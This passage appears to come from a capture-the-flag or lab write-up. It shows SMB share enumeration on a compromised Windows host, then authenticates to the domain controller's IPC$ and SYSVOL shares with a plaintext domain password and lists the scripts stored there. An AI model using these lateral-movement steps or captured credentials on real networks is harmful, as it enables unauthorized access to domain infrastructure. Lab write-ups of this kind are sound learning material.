We can enumerate SMB Shares within the machine: ^cae2ef
```bash
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC 
```
We can try to connect to the shares on the DC:
```bash
PS C:\Users\BTables\Desktop> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\BTables ++FileServerLogon12345++
The command completed successfully.
```
And then we can list the shares in the DC:
```bash
PS C:\Users\BTables\Desktop> net view \\dc.fulcrum.local\
Shared resources at \\dc.fulcrum.local\
Share name  Type  Used as  Comment              
-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share   
SYSVOL      Disk           Logon server share   
The command completed successfully.
```
We can then mount the share SYSVOL on the compromised machine to check its content:
```bash
PS C:\Users\BTables\Desktop> net use x: \\dc.fulcrum.local\SYSVOL /user:FULCRUM\BTables ++FileServerLogon12345++

The command completed successfully.
```
And we found a ton of scripts inside the Share:
```bash
PS X:\fulcrum.local\scripts> dir
    Directory: X:\fulcrum.local\scripts


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1
```
